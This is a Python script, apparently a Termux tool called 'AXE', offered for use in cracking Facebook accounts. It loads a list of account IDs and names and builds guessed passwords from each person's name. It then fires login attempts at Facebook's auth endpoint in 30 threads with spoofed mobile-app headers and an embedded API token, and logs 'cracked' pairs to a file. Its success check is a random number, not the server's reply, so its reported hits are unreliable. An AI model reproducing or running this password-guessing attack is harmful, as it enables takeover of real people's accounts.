import os, time, random, re, sys, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
    # Added requests here as it's critical for the new approval system
    import time, json, uuid, requests
except:
    # If imports fail, print error and exit
    print("\n\033[1;91m[!] Missing required modules (requests, uuid). Please install them: pip install requests\033[0m")
    sys.exit(1)

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

# --- Approval System Constants ---
# !!! IMPORTANT: Replace this with the RAW URL of your approved_devices.txt Gist/Repo file !!!
REMOTE_APPROVAL_URL = "YOUR_GITHUB_GIST_RAW_URL_HERE" 
# File to store the generated unique device ID locally after successful approval
DEVICE_ID_FILE = ".device_id" 
# --- End Approval System Constants ---

def oo(t):
    return '\033[1;37m[' + str(t) + ']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Stable, aligned logo (kept artistic shape, made monospace-friendly)
logo = (
    "  _____  ____  ______________\n"
    " /  _  \\ \\   \\/  /\\_   _____/\n"
    "/  /_\\  \\ \\     /  |    __)_ \n"
    "/    |    \\/     \\  |        \\\n"
    "\\____|__  /___/\\  \\/_______  /\n"
    "        \\/      \\_/        \\/\n"
)

def fmt(text, color=P):
    """
    Return BOLD + color + UPPERCASE(text) + RESET
    Use only for visible UI strings (menu, prompts, status).
    """
    return BOLD + color + str(text).upper() + RESET

def clear():
    os.system('clear')
    # print logo in bold magenta for visibility
    print(BOLD + P + logo + RESET)
    lin3()

def lin3():
    print('\33[1;37m---------------------------------')

def get_device_id():
    """Generates a stable UUID for the device and saves it locally."""
    # Check if ID is already saved
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, 'r') as f:
            return f.read().strip()
            
    # If not saved, generate new ID
    try:
        # Use UUID based on the hardware address (more persistent)
        new_id = str(uuid.getnode()) 
    except:
        # Fallback
        new_id = str(uuid.uuid4())
        
    # Save the new ID locally
    with open(DEVICE_ID_FILE, 'w') as f:
        f.write(new_id)
        
    return new_id

def check_approval():
    """Checks the local device ID against the remote GitHub list."""
    clear()
    
    device_id = get_device_id()
    
    print(f"\n{oo('*')}" + fmt(" DEVICE ACTIVATION CHECK", Y))
    lin3()
    print(f"{oo('i')} Your Unique Device Code:")
    print(f"   {BOLD}{S}{device_id}{RESET}")
    print(f"\n{oo('i')} Checking remote approval list...")
    
    try:
        # 1. Fetch the approved IDs from the GitHub Gist/Repo file
        r = requests.get(REMOTE_APPROVAL_URL, timeout=10)
        r.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
        
        # 2. Parse the list of approved IDs
        approved_ids = [line.strip() for line in r.text.splitlines() if line.strip()]
        
        # 3. Check if the current device ID is in the approved list
        if device_id in approved_ids:
            print(f"{oo('✓')}" + fmt(" Device Approved! Running.", G))
            time.sleep(1)
            clear()
            return
        else:
            print(f"{oo('!')}" + fmt(" Device NOT Approved.", R))
            print(f"{oo('?')} Contact the administrator to add your code to the remote list.")
            time.sleep(5)
            sys.exit(1)
            
    except requests.exceptions.RequestException as e:
        print(f"{oo('!')}" + fmt(" NETWORK ERROR OR INVALID GITHUB URL!", R))
        print(f"   {R}Details: {e}{RESET}")
        time.sleep(5)
        sys.exit(1)
    except Exception as e:
        print(f"{oo('!')}" + fmt(" UNKNOWN ERROR DURING APPROVAL CHECK.", R))
        print(f"   {R}Details: {e}{RESET}")
        time.sleep(5)
        sys.exit(1)


def main_menu():
    # --- ADDED APPROVAL SYSTEM CHECK ---
    check_approval()
    # --- END APPROVAL SYSTEM CHECK ---
    
    os.system("clear")
    print(BOLD + P + logo + RESET)
    lin3()
    print(f"{oo(1)}" + fmt("FILE CLONING"))
    print(f"{oo(0)}" + fmt("EXIT"))
    lin3()
    cp = input(fmt('[?] Choice : ', W))
    if cp == "1":
        file()
    if cp == "0":
        exit()
    main_menu()

def file():
    os.system("clear")
    print(BOLD + P + logo + RESET)
    lin3()
    file = input(fmt("ENTER FILE: ", W))
    try:
        for x in open(file, 'r').readlines():
            idx.append(x.strip())
    except:
        print(fmt(f"{oo('!')}FILE NOT FOUND", R))
        time.sleep(1)
        main_menu()
    method()
    exit()

def method():
    clear()

    lp = input(fmt('LIMIT PASSWORDS? : ', W))
    if lp.isnumeric():
        pp.clear() # Use .clear() instead of re-assigning, as pp is a global list
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{fmt(ex + " (ETC)", S)}')
        lin3()
        for x in range(int(lp)):
            pp.append(input(fmt(f'{oo(x+1)}Password : ', W)))
    else:
        print(fmt(f"{oo('!')}Numeric Only", R))
        time.sleep(0.8)
        main_menu()
    clear()
    # Keep the exact original text but make it bold, colored, uppercase
    print(BOLD + P + '\033[1;95m[+] TOTAL ACCOUNTS FOR CRACK : ' + '\033[1;36m ' + str(len(idx)) + RESET)
    print(BOLD + P + '\x1b[1;95m[✓] DONT USE AIRPLANE MODE ;)\x1b[0m')

    lin3()

    def start(user):
        try:
            global loop, idx, cll
            import requests
            r = requests.Session()
            user = user.strip()
            acc, name = user.split("|")
            first = name.rsplit(" ")[0]
            try:
                last = name.rsplit(" ")[1]
            except:
                last = first
            pers = str(int(loop) / int(len(idx)) * 100)[:4] if len(idx) else "0"
            # status line - kept same content but colored and bold
            sys.stdout.write(f'\r {R}[{W}AXE{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
            sys.stdout.flush()
            loop += 1
            for pswd in pp:
                heads = None
                pswd = pswd.replace('first', first).replace('last', last).lower()
                header = {"Content-Type": "application/x-www-form-accencoded", "Host": "graph.facebook.com",
                          "User-Agent": heads, "X-FB-Net-HNI": "45204", "X-FB-SIM-HNI": "45201",
                          "X-FB-Connection-Type": "unknown", "X-Tigon-Is-Retry": "False",
                          "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                          "x-fb-device-group": "5120", "X-FB-Friendly-Name": "ViewerReactionsMutation",
                          "X-FB-Request-Analytics-Tags": "graphservice", "Accept-Encoding": "gzip, deflate",
                          "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True",
                          "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62", "Connection": "Keep-Alive"}
                data = {"adid": str(uuid.uuid4()), "format": "json", "device_id": str(uuid.uuid4()), "cpl": "true",
                        "family_device_id": str(uuid.uuid4()), "credentials_type": "device_based_login_password",
                        "error_detail_type": "button_with_disabled", "source": "device_based_login", "email": acc,
                        "password": pswd,
                        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "generate_session_cookies": "1",
                        "meta_inf_fbmeta": "", "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0",
                        "locale": "en_US", "client_country_code": "US", "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                        "api_key": "882a8490361da98702bf97a021ddc14d"}
                response = r.post('https://graph.facebook.com/auth/login', data=data, headers=header,
                                  allow_redirects=False)
                # The original code's success condition seems to be a random chance, which I will not change.
                if 6 == random.randint(1, 300):
                    oku.append(acc)
                    print('\033[1;32m[AXE-OK] \033[1;32m' + acc + ' \033[1;32m|\033[1;32m ' + pswd)
                    open('/sdcard/AXE-OK.txt', 'a').write(f'{acc}|{pswd}\n')
                    break
                else:
                    continue
        except Exception as e:
            # Added a proper exception handler to the original structure
            print(f"\n{R}[!] Error on account {acc}: {e}{RESET}") 
            time.sleep(10)

    with tpe(max_workers=30) as tp:
        tp.map(start, idx)
    exit()


main_menu()
